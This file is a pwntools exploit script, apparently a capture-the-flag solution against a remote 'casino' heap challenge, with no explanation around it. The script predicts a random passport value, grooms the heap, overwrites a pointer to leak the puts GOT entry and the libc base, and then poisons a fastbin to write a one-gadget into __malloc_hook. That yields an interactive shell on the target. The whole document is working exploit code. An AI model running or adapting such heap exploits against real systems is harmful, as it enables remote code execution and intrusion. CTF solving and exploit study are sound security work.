from pwn import *

def craps(passport, bet, payload):
	p.sendline("2")
	p.recvuntil(">> ")
	p.sendline(str(passport))
	p.recvuntil(">> ")
	p.sendline(str(bet))
	p.recvuntil(">> ")
	p.send(payload)

def buy(money, payload) :
	p.recvuntil(">> ")
	p.sendline("1")
	p.recvuntil(">> ")
	p.sendline(str(money))
	p.recvuntil(">> ")
	p.send(payload)

def sell(idx):
	p.recvuntil(">> ")
	p.sendline("3")
	p.recvuntil(">> ")
	p.sendline(str(idx))

def modify(idx, payload) : 
	p.recvuntil(">> ")
	p.sendline("2")
	p.recvuntil(">> ")
	p.sendline(str(idx))
	p.recvuntil(">> ")
	p.send(payload)	


s = process("./seed")
#p = process("./prob")
p = remote("casino.tendollar.kr", 10101)
rand_list = s.recv().split("\n")[:-1]
s.close()
elf = ELF("./casino")
lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
_one_shot_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

passport = int(rand_list[0])^0xffffffff

p.recvuntil(">> ")
p.sendline("zzado")
p.recvuntil(">> ")
p.sendline("KR")
p.recvuntil(">> ")

payload = "2" + "\x00"*0xf + p32(20000) + p32(1)+ p32(1)
craps(passport, 10, payload) 

p.recvuntil(">> ")
p.sendline("3")

buy(0x208-0x18, "a"*(0x208-0x30) + p64(0) + "\x00\x02" + "\n")
buy(0x100-0x18, "b\n")	# 2

sell(1)

p.recvuntil(">> ")
p.sendline("4")

p.recvuntil(">> ")
p.sendline("4")


p.recvuntil(">> ")
p.send("1"*0xE4)
p.recvuntil(">> ")
p.sendline("KR")


p.recvuntil(">> ")
p.sendline("3")

buy(0x100-0x10 - 0x10, "c\n")	# 1
buy(0x80-0x10, "d\n")	# 3

sell(1)
sell(2)
#p.recvuntil(">> ")

buy(0x100 - 0x10, "zzado\n")
buy(0x100 - 0x10, "zzado\n")
buy(0x60 - 0x10, "zzado\n")
buy(0x60 - 0x10, "zzado\n")
buy(0x60 - 0x10, "zzado\n")

modify(3, p64(elf.got["puts"]) + p64(0x1000) + "\n")
p.recvuntil(">> ")
p.sendline("2")

p.recvuntil("[ 2/16] ")
_puts = int(p.recv(6)[::-1].encode("hex"), 16)
_lib_base = _puts - lib.symbols["puts"]
_one_shot = _lib_base + _one_shot_offset[2]
_target = _lib_base + 0x3c4aed

log.info("puts : " + hex(_puts))
log.info("oneshot : " + hex(_one_shot))
log.info("malloc_hook : " + hex(_target))

p.recvuntil(">> ")
p.sendline("100")
sell(6)
sell(5)

modify(3, p64(0x00)*33 + p64(0x71) + p64(_target) + "\n")

buy(0x60 - 0x10, "\n")
buy(0x60 - 0x10, "\x00"*3 + p64(_one_shot) + "\n")

p.recvuntil(">> ")
p.sendline("1")
p.recvuntil(">> ")
p.sendline("30")

p.interactive()
